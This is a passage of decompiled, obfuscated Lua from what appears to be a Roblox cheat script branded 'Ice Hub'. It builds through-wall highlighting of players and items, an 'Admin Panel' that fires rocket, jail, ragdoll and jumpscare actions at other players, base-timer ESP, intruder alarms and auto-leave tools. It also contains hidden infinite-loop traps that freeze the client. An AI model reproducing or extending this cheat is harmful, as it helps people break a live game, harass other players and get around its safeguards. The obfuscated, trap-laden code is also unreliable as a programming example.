												fn62(localPlayer.Character)

												connection2 = localPlayer.CharacterAdded:Connect(function(character)
													task.wait(0.15)
													fn62(character)
												end)
											end
										end)

										local connection3 = nil

										local function fn63(arg)
											if not tbl18.toggles.brainrotChams or not arg or not arg.Parent then
												return
											end
											local isModel = arg:IsA("Model") and arg or arg:FindFirstAncestorOfClass("Model")
											if not isModel then
												return
											end

											if isModel:FindFirstChild("AnimalOverhead", true) then
												createHighlight(isModel, "IceHub_BrainrotChams", 0.58)
											end
										end

										local function fn64()
											local debris = service3:FindFirstChild("Debris")
											if not debris then
												return
											end

											for _, child in ipairs(debris:GetChildren()) do
												fn63(child)
											end
										end

										createFrame(tbl17.espContent, "Brainrot Chams", tbl18.toggles.brainrotChams or false, function(brainrotChams)
											tbl18.toggles.brainrotChams = brainrotChams
											fn36()

											if connection3 then
												connection3:Disconnect()
												connection3 = nil
											end

											fn59(service3, "IceHub_BrainrotChams")

											if brainrotChams then
												fn64()

												connection3 = service3.DescendantAdded:Connect(function(descendant)
													if 50 >= n28(4140) then
														if descendant.Name == "AnimalOverhead" then
															task.wait(0.05)
															fn63(descendant)
														end

														return
													end

													while true do
													end
												end)
											end
										end)

										local connection4 = nil

										local function fn65(arg)
											if not tbl18.toggles.trapMineChams or not arg or not arg.Parent then
												return
											end
											local str8 = (arg.Name or ""):lower()

											if str8:find("mine") or str8:find("trap") then
												createHighlight(arg:IsA("Model") and arg or arg:FindFirstAncestorOfClass("Model") or arg, "IceHub_TrapMineChams", 0.5)
											end
										end

										createFrame(tbl17.espContent, "Trap/Mine Chams", tbl18.toggles.trapMineChams or false, function(trapMineChams)
											tbl18.toggles.trapMineChams = trapMineChams
											tbl18.toggles.trapESP = trapMineChams
											fn36()

											if connection4 then
												connection4:Disconnect()
												connection4 = nil
											end

											fn59(service3, "IceHub_TrapMineChams")

											if trapMineChams then
												for _, descendant in ipairs(service3:GetDescendants()) do
													fn65(descendant)
												end

												connection4 = service3.DescendantAdded:Connect(function(descendant)
													task.wait(0.03)
													fn65(descendant)
												end)
											end
										end)

										task.defer(function()
											if tbl18.toggles.playerChams then
												for _, player in ipairs(Players:GetPlayers()) do
													if player ~= localPlayer then
														fn60(player)
													end
												end
											end

											if tbl18.toggles.selfChams then
												fn62(localPlayer.Character)
											end

											if tbl18.toggles.brainrotChams then
												fn64()
											end

											if tbl18.toggles.trapMineChams then
												for _, descendant in ipairs(service3:GetDescendants()) do
													fn65(descendant)
												end
											end
										end)
									end)
								end
							end

							do
								local frame2, textLabel

								do
									do
										local screenGui3 = Instance.new("ScreenGui")
										screenGui3.Name = "ICE_HUB_REJOIN_GUI"
										screenGui3:SetAttribute("IceHubOwned", true)
										screenGui3.ResetOnSpawn = false
										screenGui3.DisplayOrder = 1003
										screenGui3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
										fn29(screenGui3)
										frame2 = Instance.new("Frame")
										frame2.Name = "RejoinWindow"
										frame2.Size = UDim2.new(v82[46], isMobile and 160 or 145, 0, isMobile and 76 or 68)
										frame2.Position = UDim2.new(1, -(isMobile and 175 or v82[75]), 0, 95)
										frame2.BackgroundColor3 = Color3.fromRGB(7, 20, 42)
										frame2.BackgroundTransparency = 0.42
										frame2.BorderSizePixel = 0
										frame2.Visible = tbl18.toggles.showRejoinGui ~= v82[120]
										frame2.Active = true
										frame2.Parent = screenGui3
									end

									createUICorner(frame2, 10)
									createUIStroke(frame2, 1)
									textLabel = Instance.new("TextLabel")
									textLabel.Name = "DragBar"
									textLabel.Size = UDim2.new(1, -8, v82[46], isMobile and 24 or v82[164])
									textLabel.Position = UDim2.new(0, 4, 0, 4)
									textLabel.BackgroundColor3 = Color3.fromRGB(11, 35, 68)
									textLabel.BackgroundTransparency = 0.18
									textLabel.BorderSizePixel = 0
									textLabel.Text = "REJOIN  •  DRAG"
									textLabel.TextColor3 = Color3.fromRGB(185, 220, 255)
									textLabel.TextSize = isMobile and 11 or 10
									textLabel.Font = Enum.Font.GothamBold
									textLabel.Active = true
									textLabel.Parent = frame2
									createUICorner(textLabel, 7)

									do
										local textButton2 = Instance.new("TextButton")
										textButton2.Size = UDim2.new(v82[118], -8, v82[118], -(isMobile and v82[149] or 33))
										textButton2.Position = UDim2.new(0, 4, v82[46], isMobile and 31 or 28)
										textButton2.BackgroundColor3 = Color3.fromRGB(v82[88], v82[150], 92)
										textButton2.BackgroundTransparency = 0.22
										textButton2.BorderSizePixel = 0
										textButton2.Text = "REJOIN"
										textButton2.TextColor3 = tbl17.COL_WHITE
										textButton2.TextSize = isMobile and 13 or 12
										textButton2.Font = Enum.Font.GothamBlack
										textButton2.AutoButtonColor = false
										textButton2.Parent = frame2
										createUICorner(textButton2, v82[102])
										createUIStroke(textButton2, 1)

										textButton2.MouseButton1Click:Connect(function()
											if not flag3 then
												return
											end

											pcall(function()
												TeleportService:Teleport(game.PlaceId, localPlayer)
											end)
										end)
									end
								end

								do
									local flag18 = false
									local position = nil
									local position2 = nil

									textLabel.InputBegan:Connect(function(input)
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
											flag18 = true
											position = input.Position
											position2 = frame2.Position
										end
									end)

									UserInputService.InputChanged:Connect(function(input)
										if not flag18 then
											return
										end

										if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
											local n35 = input.Position - position
											frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n35.X, position2.Y.Scale, position2.Y.Offset + n35.Y)
										end
									end)

									UserInputService.InputEnded:Connect(function(input)
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
											flag18 = v82[120]
										end
									end)
								end

								task.spawn(function()
									local v92 = tbl17
									local v93 = tbl17
									local v94 = tbl17
									local v95 = tbl17
									local v96, v97, v98, v99 = fn51("Server / Settings", "server")
									v92.spFrame = v96
									v93.spContent = v97
									v94.openServerPanel = v98
									v95.closeServerPanel = v99
									local instance3 = Instance.new(v82[139])
									instance3.Size = UDim2.new(1, -20, 0, isMobile and 38 or 34)
									instance3.BackgroundColor3 = Color3.fromRGB(15, 31, 57)
									instance3.BackgroundTransparency = 0.2
									instance3.BorderSizePixel = v82[46]
									instance3.Text = "Rejoin Server"
									instance3.TextColor3 = tbl17.COL_WHITE
									instance3.TextSize = isMobile and 14 or v82[78]
									instance3.Font = Enum.Font.GothamBold
									instance3.AutoButtonColor = false
									instance3.ZIndex = 12
									instance3.Parent = tbl17.spContent
									createUICorner(instance3, 6)
									createUIStroke(instance3, 1)

									instance3.MouseButton1Click:Connect(function()
										pcall(function()
											if n28(2553) < 153 then
												TeleportService:Teleport(game.PlaceId, localPlayer)
												return
											end

											while true do
											end
										end)
									end)

									createFrame(tbl17.spContent, "Show Rejoin GUI", tbl18.toggles.showRejoinGui ~= v82[120], function(showRejoinGui)
										tbl18.toggles.showRejoinGui = showRejoinGui
										frame2.Visible = showRejoinGui
										fn36()
									end)
								end)
							end
						end

						do
							instance2 = Instance.new(v82[84])
							instance2.Name = "ICE_HUB_ADMIN_GUI"
							instance2:SetAttribute(v82[62], true)
							instance2.ResetOnSpawn = false
							instance2.DisplayOrder = v82[117]
							instance2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
							fn29(instance2)

							task.spawn(function()
								local n35 = isMobile and 390 or 450
								local n36 = isMobile and 44 or 42
								local n37 = isMobile and v82[92] or 30
								local tbl21 = { "rocket", "jail", "balloon", "ragdoll", "jumpscare" }
								local ap = tbl18.panels.ap
								local frame2 = Instance.new("Frame")
								frame2.Name = "AdminPanelWindow"
								frame2.Size = UDim2.new(0, n35, v82[46], v82[9])
								frame2.Position = UDim2.new(ap.x or 0.72, ap.xOffset or 0, ap.y or 0.5, ap.yOffset or -150)
								frame2.BackgroundColor3 = Color3.fromRGB(7, 20, v82[27])
								frame2.BackgroundTransparency = 0.68
								frame2.BorderSizePixel = 0
								frame2.Active = true
								frame2.Visible = tbl18.panels.ap.visible ~= false
								frame2.ZIndex = 20
								frame2.Parent = instance2
								createUICorner(frame2, 14)
								createUIStroke(frame2, v82[23])
								local uiGradient = Instance.new("UIGradient")
								local colorSequence = ColorSequence.new
								local tbl22 = {}
								local v92 = ColorSequenceKeypoint.new(v82[46], Color3.fromRGB(7, 14, 33))
								local v93 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(10, 27, 55))
								local new = ColorSequenceKeypoint.new
								local color = Color3.fromRGB
								local v94 = v82[61]
								tbl22[1] = v92
								tbl22[2] = v93

								do
									local values = table.pack(new(1, color(v94, 10, 24)))
									table.move(values, 1, values.n, 3, tbl22)
								end

								uiGradient.Color = colorSequence(tbl22)
								uiGradient.Rotation = 130
								uiGradient.Parent = frame2
								local frame3 = Instance.new("Frame")
								frame3.Size = UDim2.new(1, 0, v82[46], 42)
								frame3.BackgroundTransparency = 1
								frame3.BorderSizePixel = v82[46]
								frame3.ZIndex = 21
								frame3.Parent = frame2
								local instance3 = Instance.new(v82[176])
								instance3.Size = UDim2.new(1, -90, 1, 0)
								instance3.Position = UDim2.new(0, v82[21], 0, 0)
								instance3.BackgroundTransparency = v82[118]
								instance3.Text = "Admin Panel"
								instance3.TextColor3 = Color3.fromRGB(225, 242, 255)
								instance3.TextSize = isMobile and 14 or 16
								instance3.Font = Enum.Font.GothamBlack
								instance3.TextXAlignment = Enum.TextXAlignment.Left
								instance3.ZIndex = 22
								instance3.Parent = frame3
								local instance4 = Instance.new(v82[139])
								instance4.Size = UDim2.new(0, 58, v82[46], 26)
								instance4.Position = UDim2.new(v82[118], -92, v82[91], -13)
								instance4.BackgroundColor3 = Color3.fromRGB(18, 65, 112)
								instance4.BackgroundTransparency = 0.48
								instance4.BorderSizePixel = 0
								instance4.Text = "Refresh"
								instance4.TextColor3 = Color3.fromRGB(205, v82[175], 255)
								instance4.TextSize = 9
								instance4.Font = Enum.Font.GothamBold
								instance4.ZIndex = 23
								instance4.Parent = frame3
								createUICorner(instance4, 7)
								createUIStroke(instance4, 1)
								local instance5 = Instance.new(v82[139])
								instance5.Size = UDim2.new(0, 26, 0, 26)
								instance5.Position = UDim2.new(1, -30, v82[91], -v82[21])
								instance5.BackgroundColor3 = Color3.fromRGB(18, 65, 112)
								instance5.BackgroundTransparency = 0.48
								instance5.BorderSizePixel = 0
								instance5.Text = "X"
								instance5.TextColor3 = Color3.fromRGB(v82[49], 230, v82[196])
								instance5.TextSize = 11
								instance5.Font = Enum.Font.GothamBlack
								instance5.ZIndex = 23
								instance5.Parent = frame3
								createUICorner(instance5, 7)
								createUIStroke(instance5, 1)
								local instance6 = Instance.new(v82[176])
								instance6.Size = UDim2.new(1, -18, v82[46], 22)
								instance6.Position = UDim2.new(v82[46], 9, 0, 44)
								instance6.BackgroundTransparency = 1
								instance6.Text = "Click player = spam all  |  icon = one function"
								instance6.TextColor3 = Color3.fromRGB(105, 185, v82[196])
								instance6.TextSize = 10
								instance6.Font = Enum.Font.GothamBold
								instance6.TextXAlignment = Enum.TextXAlignment.Left
								instance6.ZIndex = 22
								instance6.Parent = frame2
								local frame4 = Instance.new("Frame")
								frame4.Size = UDim2.new(v82[118], -18, 0, 100)
								frame4.Position = UDim2.new(0, 9, 0, 70)
								frame4.BackgroundTransparency = 1
								frame4.ZIndex = 22
								frame4.Parent = frame2
								local instance7 = Instance.new(v82[191])
								instance7.SortOrder = Enum.SortOrder.LayoutOrder
								instance7.Padding = UDim.new(0, 7)
								instance7.Parent = frame4

								local function fn58(arg)
									return fn30(arg)
								end

								local function fn59(arg)
									local n38 = math.max(1, arg)
									local v95 = v82[102]
									local n39 = n38 * n36 + math.max(0, n38 - 1) * v95
									frame4.Size = UDim2.new(v82[118], -v82[190], 0, n39)
									frame2.Size = UDim2.new(v82[46], n35, 0, 82 + n39)
								end

								local function fn60()
									for _, child in ipairs(frame4:GetChildren()) do
										if child:IsA("Frame") then
											child:Destroy()
										end
									end

									local layoutOrder = 0

									for _, player in ipairs(Players:GetPlayers()) do
										if player ~= localPlayer then
											layoutOrder += 1
											local instance8 = Instance.new(v82[53])
											instance8.Size = UDim2.new(1, 0, 0, n36)
											instance8.LayoutOrder = layoutOrder
											instance8.BackgroundColor3 = Color3.fromRGB(v82[78], v82[58], 49)
											instance8.BackgroundTransparency = 0.45
											instance8.BorderSizePixel = 0
											instance8.ZIndex = 23
											instance8.Parent = frame4
											createUICorner(instance8, 7)
											createUIStroke(instance8, 1)
											local n38 = #tbl21 * (n37 + 5) + 4
											local textButton2 = Instance.new("TextButton")
											textButton2.Size = UDim2.new(1, -n38 - 8, v82[118], 0)
											textButton2.Position = UDim2.new(0, 8, v82[46], 0)
											textButton2.BackgroundTransparency = 1
											textButton2.Text = (player.DisplayName or player.Name) .. "  (@" .. player.Name .. ")"
											textButton2.TextColor3 = Color3.fromRGB(220, 235, 255)
											textButton2.TextSize = isMobile and 10 or v82[185]
											textButton2.Font = Enum.Font.GothamBold
											textButton2.TextXAlignment = Enum.TextXAlignment.Left
											textButton2.TextTruncate = Enum.TextTruncate.AtEnd
											textButton2.ZIndex = v82[58]
											textButton2.Parent = instance8

											textButton2.MouseButton1Click:Connect(function()
												task.spawn(function()
													fn33(player)
												end)
											end)

											for i, v95 in ipairs(tbl21) do
												local instance9 = Instance.new(v82[139])
												instance9.Name = "Quick_" .. v95
												instance9.Size = UDim2.new(0, n37, 0, n37)
												instance9.Position = UDim2.new(1, -((#tbl21 - i + 1) * (n37 + v82[61])) + 5, 0.5, -n37 / 2)
												instance9.BackgroundColor3 = Color3.fromRGB(28, 23, 62)
												instance9.BackgroundTransparency = 0.02
												instance9.BorderSizePixel = 0
												instance9.Text = ""
												instance9.ZIndex = 25
												instance9.Parent = instance8
												createUICorner(instance9, v82[188])
												createUIStroke(instance9, 1)

												if not fn31(fn58(v95), instance9) then
													instance9.Text = "?"
													instance9.TextColor3 = Color3.fromRGB(235, 240, 255)
													instance9.TextSize = 12
													instance9.Font = Enum.Font.GothamBlack
												end

												instance9.MouseButton1Click:Connect(function()
													task.spawn(function()
														fn32(player, v95)
													end)
												end)
											end
										end
									end

									fn59(layoutOrder)
								end

								local flag18 = false
								local position = nil
								local position2 = nil

								frame3.InputBegan:Connect(function(input)
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
										flag18 = true
										position = input.Position
										position2 = frame2.Position
									end
								end)

								UserInputService.InputChanged:Connect(function(input)
									if flag18 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
										local n38 = input.Position - position
										frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n38.X, position2.Y.Scale, position2.Y.Offset + n38.Y)
									end
								end)

								UserInputService.InputEnded:Connect(function(input)
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
										if flag18 then
											flag18 = v82[120]
											tbl18.panels.ap.x = frame2.Position.X.Scale
											tbl18.panels.ap.xOffset = frame2.Position.X.Offset
											tbl18.panels.ap.y = frame2.Position.Y.Scale
											tbl18.panels.ap.yOffset = frame2.Position.Y.Offset
											fn36()
										end
									end
								end)

								local function openAPPanel()
									frame2.Visible = true
									tbl18.panels.ap.visible = true
									fn36()
									fn60()
								end

								local function closeAPPanel()
									frame2.Visible = false
									tbl18.panels.ap.visible = false
									fn36()
								end

								tbl17.apFrame = frame2
								tbl17.apContent = frame4
								tbl17.openAPPanel = openAPPanel
								tbl17.closeAPPanel = closeAPPanel
								instance5.MouseButton1Click:Connect(closeAPPanel)
								instance4.MouseButton1Click:Connect(fn60)

								Players.PlayerAdded:Connect(function()
									task.wait(0.2)
									fn60()
								end)

								Players.PlayerRemoving:Connect(function()
									task.wait(0.2)
									fn60()
								end)

								fn60()
							end)

							task.spawn(function()
								local v92 = tbl17
								local v93 = tbl17
								local v94 = tbl17
								local v95 = tbl17
								local baseProtection, v96, v97, v98 = fn51("Base Protection", "baseTimer")
								v92.btFrame = baseProtection
								v93.btContent = v96
								v94.openBTPanel = v97
								v95.closeBTPanel = v98
								local intruderAlarm = tbl18.toggles.intruderAlarm or false
								local autoLeave = tbl18.toggles.autoLeave or false
								local autoLeaveCooldown = tonumber(tbl18.autoLeaveCooldown) or 2
								local flag18 = false
								local baseTimerESP = tbl18.toggles.baseTimerESP or false
								local tbl21 = {}
								local obj = setmetatable({}, { __mode = "k" })
								local v99 = nil
								local stealHitbox = nil
								local remainingTime = nil
								local n35 = 0
								local screenGui3 = Instance.new("ScreenGui")
								screenGui3.Name = "ICE_HUB_ALARM_GUI"
								screenGui3:SetAttribute("IceHubOwned", true)
								screenGui3.ResetOnSpawn = false
								screenGui3.DisplayOrder = 500
								screenGui3.Parent = playerGui
								local textLabel = Instance.new("TextLabel")
								textLabel.AnchorPoint = Vector2.new(0.5, 1)
								textLabel.Position = UDim2.new(0.5, v82[46], 0.92, 0)
								textLabel.Size = UDim2.new(v82[46], 600, 0, 80)
								textLabel.BackgroundTransparency = 1
								textLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
								textLabel.TextSize = 26
								textLabel.Font = Enum.Font.GothamBold
								textLabel.TextWrapped = true
								textLabel.TextStrokeTransparency = 0.3
								textLabel.TextStrokeColor3 = Color3.new(0, 0, v82[46])
								textLabel.Visible = v82[120]
								textLabel.Parent = screenGui3

								local function fn58()
									if v99 and v99.Parent then
										return v99
									end
									local plots = service3:FindFirstChild("Plots")
									if not plots then
										return nil
									end
									local str8 = localPlayer.Name:lower()
									local str9 = localPlayer.DisplayName:lower()

									for _, child in ipairs(plots:GetChildren()) do
										local plotSign = child:FindFirstChild("PlotSign")

										if plotSign then
											local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild("Frame")
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild("TextLabel")

											if surfaceGui then
												surfaceGui = tostring(surfaceGui.Text or ""):lower()
											end

											surfaceGui = surfaceGui or ""
											local yourBase = plotSign:FindFirstChild("YourBase", true)
											local pos = surfaceGui:find(str8, 1, true) or surfaceGui:find(str9, 1, true)
											local enabled

											if pos then
												enabled = pos
											else
												enabled = yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled
											end

											if enabled then
												v99 = child
												return child
											end
										end
									end

									return nil
								end

								local function fn59()
									if stealHitbox and stealHitbox.Parent then
										return stealHitbox
									end
									local v100 = fn58()
									if not v100 then
										return nil
									end
									stealHitbox = v100:FindFirstChild("StealHitbox", true)
									return stealHitbox
								end

								local function fn60()
									if remainingTime and remainingTime.Parent then
										return remainingTime
									end
									local v100 = fn58()
									if not v100 then
										return nil
									end
									local purchases = v100:FindFirstChild("Purchases")
									purchases = purchases and purchases:FindFirstChild("PlotBlock")
									purchases = purchases and purchases:FindFirstChild("Main")
									purchases = purchases and purchases:FindFirstChild("BillboardGui")
									remainingTime = purchases and purchases:FindFirstChild("RemainingTime") or nil
									return remainingTime
								end

								local plots = service3:FindFirstChild("Plots")

								if plots then
									plots.ChildAdded:Connect(function()
										v99 = nil
										stealHitbox = nil
										remainingTime = nil
									end)

									plots.ChildRemoved:Connect(function(child)
										if v99 == child then
											v99 = nil
											stealHitbox = nil
											remainingTime = nil
										end

										obj[child] = nil
									end)
								end

								local function fn61(arg)
									local str8 = tostring(arg or ""):lower():gsub("%s+", "")
									local match, v100 = str8:match("^(%d+):(%d+)$")
									if match and v100 then
										return tonumber(match) * 60 + tonumber(v100)
									end
									local match2, v101, v102 = str8:match("^(%d+):(%d+):(%d+)$")
									if match2 and v101 and v102 then
										return tonumber(match2) * 3600 + tonumber(v101) * 60 + tonumber(v102)
									end
									local match3 = str8:match("([%d%.]+)")
									return tonumber(match3)
								end

								local function fn62()
									if flag18 then
										return
									end
									flag18 = v82[76]
									textLabel.Text = "AUTO LEAVE • TIMER REACHED"
									textLabel.TextColor3 = Color3.fromRGB(80, 190, 255)
									textLabel.Visible = v82[76]

									task.spawn(function()
										task.wait(0.05)
										local flag19 = v82[120]

										pcall(function()
											if game.Shutdown then
												game:Shutdown()
												flag19 = true
											end
										end)

										if not flag19 then
											pcall(function()
												localPlayer:Kick("Ice Hub • Auto Leave • Base timer reached")
											end)
										end
									end)
								end

								local function fn63()
									n35 += 1
									local v100 = n35

									task.spawn(function()
										while intruderAlarm and v100 == n35 do
											local v101 = fn59()

											if not v101 then
												textLabel.Visible = false
											else
												local cFrame = v101.CFrame
												local size = v101.Size
												local n36 = size.X * 0.5
												local n37 = size.Z * 0.5
												local tbl22 = {}

												for _, player in ipairs(Players:GetPlayers()) do
													if player ~= localPlayer and player.Character then
														local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

														if humanoidRootPart then
															local v102 = cFrame:PointToObjectSpace(humanoidRootPart.Position)

															if math.abs(v102.X) <= n36 and math.abs(v102.Z) <= n37 then
																table.insert(tbl22, player.Name)
															end
														end
													end
												end

												if #tbl22 > v82[46] then
													textLabel.TextColor3 = Color3.fromRGB(80, 190, 255)
													textLabel.Text = "🚨 " .. #tbl22 .. " Player" .. (#tbl22 > 1 and "s" or "") .. " in your Base! 🚨\n" .. table.concat(tbl22, ", ")
													textLabel.Visible = true
												else
													textLabel.Visible = false
												end
											end

											task.wait(0.18)
										end
									end)

									if n24 >= 9608 then
										while v82[76] do
										end
									end
								end

								local function fn64()
									for _, v100 in pairs(tbl21) do
										if v100 then
											pcall(function()
												v100:Destroy()
											end)
										end
									end

									tbl21 = {}
								end

								local function fn65(arg)
									local flag19 = not arg
									local flag20

									if flag19 then
										flag20 = flag19
									else
										flag20 = not (arg:IsA("TextLabel") or arg:IsA("TextButton") or arg:IsA("TextBox"))
									end

									if flag20 then
										return false
									end
									local str8 = tostring(arg.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
									if str8 == "" then
										return false
									end
									local str9 = str8:gsub("%s+", "")
									if str9:match("^%d+:%d+$") or str9:match("^%d+:%d+:%d+$") then
										return v82[76]
									end

									if str9:lower():match("^%d+%.?%d*s$") then
										return v82[76]
									end
									local str10 = tostring(arg.Name or ""):lower()
									if (str10:find("time", 1, true) or str10:find("lock", 1, true) or str10:find("cooldown", 1, true) or str10:find("open", 1, v82[76])) and str9:match("%d") then
										return true
									end
									return false
								end

								local function fn66(parent)
									if not parent then
										return nil, nil
									end
									local v100 = obj[parent]
									if v100 and v100.timer and v100.timer.Parent and v100.anchor and v100.anchor.Parent then
										return v100.timer, v100.anchor
									end
									local purchases = parent:FindFirstChild("Purchases")
									purchases = purchases and purchases:FindFirstChild("PlotBlock")
									purchases = purchases and purchases:FindFirstChild(v82[179])
									purchases = purchases and purchases:FindFirstChild("BillboardGui")
									local remainingTime2 = purchases and purchases:FindFirstChild("RemainingTime") or parent:FindFirstChild("RemainingTime", true)
									if not remainingTime2 or not fn65(remainingTime2) then
										return nil, nil
									end
									local iceHubTimerFloor1Anchor = parent:FindFirstChild("IceHubTimerFloor1Anchor")

									if not iceHubTimerFloor1Anchor or not iceHubTimerFloor1Anchor:IsA("BasePart") then
										if iceHubTimerFloor1Anchor then
											pcall(function()
												iceHubTimerFloor1Anchor:Destroy()
											end)
										end

										iceHubTimerFloor1Anchor = Instance.new("Part")
										iceHubTimerFloor1Anchor.Name = "IceHubTimerFloor1Anchor"
										iceHubTimerFloor1Anchor.Size = Vector3.new(0.2, 0.2, 0.2)
										iceHubTimerFloor1Anchor.Anchored = v82[76]
										iceHubTimerFloor1Anchor.CanCollide = false
										iceHubTimerFloor1Anchor.CanTouch = false
										iceHubTimerFloor1Anchor.CanQuery = false
										iceHubTimerFloor1Anchor.Transparency = 1
										iceHubTimerFloor1Anchor.Parent = parent
									end

									local position = parent:GetPivot().Position
									iceHubTimerFloor1Anchor.CFrame = CFrame.new(position.X, -6, position.Z)
									obj[parent] = { timer = remainingTime2, anchor = iceHubTimerFloor1Anchor }
									return remainingTime2, iceHubTimerFloor1Anchor
								end

								local function fn67()
									if not baseTimerESP then
										fn64()
										return
									end
									local plots2 = service3:FindFirstChild("Plots")
									if not plots2 then
										fn64()
										return
									end
									local tbl22 = {}

									for _, child in ipairs(plots2:GetChildren()) do
										if child:IsA("Model") then
											local v100, v101 = fn66(child)

											if v100 and v101 then
												tbl22[child] = v82[76]
												local billboardGui = tbl21[child]

												if billboardGui and billboardGui.Parent then
													billboardGui.Adornee = v101
												end

												if not billboardGui or not billboardGui.Parent then
													billboardGui = Instance.new("BillboardGui")
													billboardGui.Name = v83()
													billboardGui.Size = UDim2.new(v82[46], 150, v82[46], v82[87])
													billboardGui.StudsOffset = Vector3.new(0, v82[113], 0)
													billboardGui.AlwaysOnTop = true
													billboardGui.Adornee = v101
													billboardGui.MaxDistance = 2000
													billboardGui.Parent = child
													local textLabel2 = Instance.new("TextLabel")
													textLabel2.Name = "TimerText"
													textLabel2.Size = UDim2.new(v82[118], v82[46], 1, 0)
													textLabel2.BackgroundTransparency = 1
													textLabel2.TextSize = 22
													textLabel2.Font = Enum.Font.GothamBlack
													textLabel2.TextColor3 = Color3.fromRGB(v82[196], 255, 255)
													textLabel2.TextStrokeTransparency = 0
													textLabel2.TextStrokeColor3 = Color3.new(v82[46], 0, v82[46])
													textLabel2.Parent = billboardGui
													tbl21[child] = billboardGui
												else
													billboardGui.Adornee = v101
												end

												local timerText = billboardGui:FindFirstChild("TimerText")

												if timerText then
													local str8 = tostring(v100.Text or "")
													timerText.Text = str8 ~= "" and str8 or "0:00"
												end
											end
										end
									end

									for k, v100 in pairs(tbl21) do
										if not tbl22[k] or not k.Parent then
											if v100 then
												pcall(function()
													v100:Destroy()
												end)
											end

											tbl21[k] = nil
										end
									end
								end

								task.spawn(function()
									while true do
										task.wait(autoLeave and 0.25 or baseTimerESP and 1 or 2)

										if baseTimerESP then
											pcall(fn67)
										end

										if autoLeave and not flag18 then
											pcall(function()
												local v100 = fn60()
												if not v100 then
													return
												end
												local v101 = fn61(v100.Text)

												if v101 and v101 > 0 and v101 <= autoLeaveCooldown then
													fn62()
												end
											end)
										end
									end
								end)

								createFrame(tbl17.btContent, "Intruder Alarm", intruderAlarm, function(intruderAlarm2)
									intruderAlarm = intruderAlarm2
									tbl18.toggles.intruderAlarm = intruderAlarm2
									fn36()

									if intruderAlarm2 then
										fn63()
									else
										n35 += v82[118]
										textLabel.Visible = false
									end
								end)

								createFrame(tbl17.btContent, "Auto Leave", autoLeave, function(autoLeave2)
									autoLeave = autoLeave2
									tbl18.toggles.autoLeave = autoLeave2
									fn36()

									if autoLeave2 then
										flag18 = false
									end
								end)

								local frame2 = Instance.new("Frame")
								frame2.Size = UDim2.new(1, -v82[69], 0, isMobile and 36 or v82[153])
								frame2.BackgroundColor3 = Color3.fromRGB(15, 31, 57)
								frame2.BackgroundTransparency = 0.2
								frame2.BorderSizePixel = v82[46]
								frame2.ZIndex = 12
								frame2.Parent = tbl17.btContent
								createUICorner(frame2, 6)
								local instance3 = Instance.new(v82[176])
								instance3.Size = UDim2.new(1, -78, 1, 0)
								instance3.Position = UDim2.new(v82[46], 8, v82[46], 0)
								instance3.BackgroundTransparency = 1
								instance3.Text = "Leave At Timer"
								instance3.TextColor3 = tbl17.COL_WHITE
								instance3.TextSize = isMobile and 13 or 11
								instance3.Font = Enum.Font.GothamBold
								instance3.TextXAlignment = Enum.TextXAlignment.Left
								instance3.ZIndex = 13
								instance3.Parent = frame2
								local textBox = Instance.new("TextBox")
								textBox.Size = UDim2.new(0, 58, v82[46], isMobile and 24 or 20)
								textBox.Position = UDim2.new(1, -66, 0.5, isMobile and -12 or -v82[4])
								textBox.BackgroundColor3 = Color3.fromRGB(8, 22, 45)
								textBox.BackgroundTransparency = v82[1]
								textBox.BorderSizePixel = v82[46]
								textBox.Text = tostring(autoLeaveCooldown)
								textBox.TextColor3 = Color3.fromRGB(v82[32], 190, 255)
								textBox.TextSize = isMobile and v82[78] or 10
								textBox.Font = Enum.Font.GothamBold
								textBox.ClearTextOnFocus = false
								textBox.ZIndex = 13
								textBox.Parent = frame2
								createUICorner(textBox, v82[61])
								createUIStroke(textBox, 1)

								textBox.FocusLost:Connect(function()
									local num = tonumber(textBox.Text)
									if not num then
										textBox.Text = tostring(autoLeaveCooldown)
										return
									end
									autoLeaveCooldown = math.floor(math.clamp(num, v82[46], 60) * 10 + 0.5) / 10
									flag18 = v82[120]
									tbl18.autoLeaveCooldown = autoLeaveCooldown
									textBox.Text = tostring(autoLeaveCooldown)
									fn36()
								end)

								createFrame(tbl17.btContent, "Timer ESP", baseTimerESP, function(baseTimerESP2)
									baseTimerESP = baseTimerESP2
									tbl18.toggles.baseTimerESP = baseTimerESP2
									fn36()

									if not baseTimerESP2 then
										fn64()
									end
								end)

								createFrame2(tbl17.btContent, "Clear All Timers", function()
									fn64()
								end)
							end)

							fn55 = function(parent, arg)
								local frame2 = Instance.new("Frame")
								frame2.Name = v83()
								frame2.Size = UDim2.new(1, 0, 0, 0)
								frame2.AutomaticSize = Enum.AutomaticSize.Y
								frame2.BackgroundColor3 = Color3.fromRGB(7, 24, v82[19])
								frame2.BackgroundTransparency = 0.48
								frame2.BorderSizePixel = 0
								frame2.ZIndex = 12
								frame2.LayoutOrder = #parent:GetChildren()
								frame2.Parent = parent
								createUICorner(frame2, 10)
								local uiStroke = Instance.new("UIStroke")
								uiStroke.Color = Color3.fromRGB(65, v82[145], v82[196])
								uiStroke.Thickness = v82[118]
								uiStroke.Transparency = 0.45
								uiStroke.Parent = frame2
								local uiListLayout = Instance.new("UIListLayout")
								uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout.Padding = UDim.new(0, 5)
								uiListLayout.Parent = frame2
								local uiPadding = Instance.new("UIPadding")
								uiPadding.PaddingTop = UDim.new(0, 7)
